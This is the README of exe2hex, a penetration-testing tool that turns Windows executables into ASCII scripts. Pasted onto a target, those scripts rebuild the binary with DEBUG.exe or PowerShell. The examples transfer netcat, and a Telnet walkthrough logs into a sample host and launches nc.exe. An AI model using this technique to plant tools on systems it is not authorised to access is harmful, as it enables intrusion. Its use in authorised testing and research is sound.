# exe2hex

Inline file transfer using in-built Windows tools (`DEBUG.exe` or PowerShell).

<p align="center">
  <img src="http://i.imgur.com/n6Op45O.png" alt="exe2hex logo"/>
</p>

- - -

### Overview

exe2hex encodes an executable binary file into ASCII text format.

The result then can be transferred to the target machine (It is much easier to echo a ASCII file than binary data).

Upon executing exe2hex's output file, the original program is restored by using `DEBUG.exe` or PowerShell (which are pre-installed by default on Windows).

```Binary EXE -> ASCII Text -> *Transfer* -> Binary EXE```

![](https://i.imgur.com/6ZWU9OP.png)

- - -

### Quick Guide

 + Input using a file (`-x /path/to/binary-program.exe`) or STDIN (`-s`)
 + Output to BATch (`-b file.bat`) and/or PoSH (`-p powershell.cmd`)

#### Example Usage

**Create BATch & PowerShell files**:
```bash
$ python3 exe2hex.py -x /usr/share/windows-binaries/sbd.exe
[*] exe2hex v1.4
[i] Outputting to /root/sbd.bat (BATch) and /root/sbd.cmd (PoSh)
[+] Successfully wrote (BATch) /root/sbd.bat
[+] Successfully wrote (PoSh) /root/sbd.cmd
$
```

**Compress the file before creating a BATch file**:
```bash
$ ./exe2hex.py -x /usr/share/windows-binaries/nc.exe -b /var/www/html/nc.txt -cc
[*] exe2hex v1.4
[i] Attempting to clone and compress
[i] Creating temporary file /tmp/tmpll55q5u9
[+] Compression (strip) was successful! (0.0% saved)
[+] Compression (UPX) was successful! (50.9% saved)
[+] Successfully wrote (BATch) /var/www/html/nc.txt
$
```

**Use STDIN to create BATch & PowerShell files**:
```bash
$ cat /usr/share/windows-binaries/whoami.exe | python3 exe2hex.py -s -b debug.bat -p ps.cmd
[*] exe2hex v1.4
[i] Reading from STDIN
[+] Successfully wrote (BATch) /root/debug.bat
[+] Successfully wrote (PoSh) /root/ps.cmd
$
```

#### Help

```bash
$ python3 exe2hex.py
[*] exe2hex v1.4

Encodes an executable binary file into ASCII text format
Restore using DEBUG.exe (BATch - x86) or PowerShell (PoSh - x86/x64)

Quick Guide:
 + Input binary file with -s or -x
 + Output with -b and/or -p
Example:
 $ /usr/bin/exe2hex -x /usr/share/windows-binaries/sbd.exe
 $ /usr/bin/exe2hex -x /usr/share/windows-binaries/nc.exe -b /var/www/html/nc.txt -cc
 $ cat /usr/share/windows-binaries/whoami.exe | /usr/bin/exe2hex -s -b debug.bat -p ps.cmd

--- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

Usage: exe2hex [options]

Options:
  -h, --help  show this help message and exit
  -x EXE      The EXE binary file to convert
  -s          Read from STDIN
  -b BAT      BAT output file (DEBUG.exe method - x86)
  -p POSH     PoSh output file (PowerShell method - x86/x64)
  -e          URL encode the output
  -r TEXT     pRefix - text to add before the command on each line
  -f TEXT     suFfix - text to add after the command on each line
  -l INT      Maximum HEX values per line
  -c          Clones and compress the file before converting (-cc for higher
              compression)
  -t          Create a Expect file, to automate to Telnet session.
  -v          Enable verbose mode
$
```

- - -

### Methods/OS Support

+ **`DEBUG.exe` (BATch mode - `-b`)**
  + Supports x86 OSs (No x64 support).
  + Useful for legacy versions of Windows (e.g. Windows XP/Windows 2000).
    + Pre-installed by default. Works out of the box.
  + ~~Limitation of 64k file size for binary programs.~~ Creates multiple parts and joins with `copy /b` so this is not an issue anymore!
+ **PowerShell (PoSh mode - `-p`)**
  + Supports both x86 & x64 OSs.
  + Aimed at more "recent" versions of Windows.
    + PowerShell was first integrated into core OS with Windows 7/Windows Server 2008 R2.
    + Windows XP SP2, Windows Server 2003 & Windows Vista requires PowerShell to be pre-installed.
  + This is **not** a `.ps1` file (pure PowerShell). It only calls PowerShell at the end to convert.

- - -

### Features

**Primary purpose**: Convert a binary program into a ASCII HEX file which can be restored using in-built OS programs.

+ Work on old and new versions of Windows without requiring any 3rd party programs to be pre-installed.
+ Supports x86 & x64 OSs.
+ Can use DEBUG.exe or PowerShell to restore the file.
+ Able to compress the file before converting.
+ URL encode the output.
+ The option to add prefix and suffix text to each line.
+ Able to set a maximum HEX length per line.
+ Can use a binary file or pipe from standard input (`STDIN`).
+ Automate transfers over Telnet.

Note: This is nothing new. [The core idea (using DEBUG.exe for inline file transfer) has been around since 2003](https://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-chong.pdf) _(if not earlier!)_.

- - -

### Telnet

When pasting a large amount of data (100+ lines) directly into a Telnet session, the results can be "unpredictable". Behaviours include lines being executed in a incorrect order or characters are just completely skipped.

A solution is to use "[Expect](http://expect.sourceforge.net/)" (which is an extension of [TCL](https://sourceforge.net/projects/tcl/)). Expect can be found in a most major Linux OSs repositories (`apt-get -y install expect` / `yum -y install expect` / `pacman -S expect`). Upon executing exe2hex's Telnet script, Expect will automate the Telnet login (based on the arguments used), look for a writeable folder (e.g. defaults to the system variable, `%TEMP%`) and then start inputting commands from exe2hex's .bat file, line by line one at a time. If required, the variables at the top of the Expect script can be manually edited (to use a different Telnet port, path, or command prompt).

An example of exe2hex's Telnet mode can be seen below:

```bash
root@kali:~# exe2hex -x /usr/share/windows-binaries/nc.exe -b nc.bat -t
[*] exe2hex v1.4
[+] Successfully wrote (BATch) /root/nc.bat
[+] Successfully wrote (Expect) /root/nc-telnet
root@kali:~#
root@kali:~# expect /root/nc-telnet
Usage: ./nc-telnet <ip> <username> <password>
root@kali:~#
root@kali:~# expect /root/nc-telnet 192.168.103.204 winxp 123456
spawn telnet 192.168.103.204
Trying 192.168.103.204...
Connected to 192.168.103.204.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: winxp
password:

*===============================================================
Welcome to Microsoft Telnet Server.
*===============================================================
C:\Documents and Settings\WinXP>cd %TEMP%
C:\DOCUME~1\WinXP\LOCALS~1\Temp>echo 86484.0 > nc.bat
86484.0 E~1\WinXP\LOCALS~1\Temp>type nc.bat

C:\DOCUME~1\WinXP\LOCALS~1\Temp>

[i] Writable folder!

C:\DOCUME~1\WinXP\LOCALS~1\Temp>del /F nc.bat
C:\DOCUME~1\WinXP\LOCALS~1\Temp>echo n nc.0>nc.hex
C:\DOCUME~1\WinXP\LOCALS~1\Temp>C:\DOCUME~1\WinXP\LOCALS~1\Temp>   (Progress: 1/938)
echo e 0100>>nc.hex

...SNIP...

C:\DOCUME~1\WinXP\LOCALS~1\Temp>C:\DOCUME~1\WinXP\LOCALS~1\Temp>   (Progress: 934/938)
move /Y nc.0 nc.exe
C:\DOCUME~1\WinXP\LOCALS~1\Temp>C:\DOCUME~1\WinXP\LOCALS~1\Temp>   (Progress: 935/938)
echo. >nc.hex
C:\DOCUME~1\WinXP\LOCALS~1\Temp>C:\DOCUME~1\WinXP\LOCALS~1\Temp>   (Progress: 936/938)
C:\DOCUME~1\WinXP\LOCALS~1\Temp\nc.hex
The process cannot access the file because it is being used by another process.

C:\DOCUME~1\WinXP\LOCALS~1\Temp>C:\DOCUME~1\WinXP\LOCALS~1\Temp>   (Progress: 937/938)

C:\DOCUME~1\WinXP\LOCALS~1\Temp>start /wait /b nc.exe
```